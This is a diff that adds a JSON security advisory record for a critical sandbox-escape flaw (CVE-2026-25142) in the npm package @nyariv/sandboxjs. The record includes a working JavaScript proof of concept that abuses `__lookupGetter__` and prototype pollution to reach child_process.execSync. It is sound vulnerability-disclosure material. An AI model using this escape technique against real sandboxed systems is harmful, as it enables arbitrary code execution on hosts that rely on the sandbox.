@@ -1,0 +1,56 @@
+{
+  "Severity": "CRITICAL",
+  "UpdatedAt": "2026-02-02T20:17:40Z",
+  "Package": {
+    "Ecosystem": "NPM",
+    "Name": "@nyariv/sandboxjs"
+  },
+  "Advisory": {
+    "DatabaseId": 335083,
+    "Id": "GSA_kwCzR0hTQS05cDR3LWZxOG0tMmhwN84ABRzr",
+    "GhsaId": "GHSA-9p4w-fq8m-2hp7",
+    "References": [
+      {
+        "Url": "https://github.com/nyariv/SandboxJS/security/advisories/GHSA-9p4w-fq8m-2hp7"
+      },
+      {
+        "Url": "https://github.com/nyariv/SandboxJS/commit/75c8009db32e6829b0ad92ca13bf458178442bd3"
+      },
+      {
+        "Url": "https://github.com/nyariv/SandboxJS/blob/f212a38fb5a6d4bc2bc2e2466c0c011ce8d41072/src/executor.ts#L368-L398"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-9p4w-fq8m-2hp7"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-9p4w-fq8m-2hp7"
+      },
+      {
+        "Type": "CVE",
+        "Value": "CVE-2026-25142"
+      }
+    ],
+    "Description": "### Summary\n\nSandboxJS does not properly restrict `__lookupGetter__` which can be used to obtain prototypes, which can be used for escaping the sandbox / remote code execution.\n\n### Details\n\nhttps://github.com/nyariv/SandboxJS/blob/f212a38fb5a6d4bc2bc2e2466c0c011ce8d41072/src/executor.ts#L368-L398\n\nThe Object prototype which contains `__lookupGetter__` is properly protected, but the special case for accessing function properties bypasses the prototype chain checks including the root Object prototype.\n\n### PoC\n```js\nconst s = require(\"@nyariv/sandboxjs\").default;\nconst sb = new s();\n\npayload = `\nlet getProto = Object.toString.__lookupGetter__(\"__proto__\")\nlet m = getProto.call(new Map());\nm.has = isFinite;\n\nconsole.log(\n  isFinite.constructor(\n    \"return process.getBuiltinModule('child_process').execSync('ls -lah').toString()\",\n  )(),\n);`\nsb.compile(payload)().run();\n```\n\n### Impact\nPrototype Pollution -\u003e RCE",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2026-02-02T20:17:39Z",
+    "Severity": "CRITICAL",
+    "Summary": "SandboxJS Vulnerable to Prototype Pollution -\u003e Sandbox Escape -\u003e RCE",
+    "UpdatedAt": "2026-02-02T20:17:40Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 10,
+      "VectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H"
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "0.8.27"
+      },
+      "VulnerableVersionRange": "\u003c= 0.8.26"
+    }
+  ]
+}
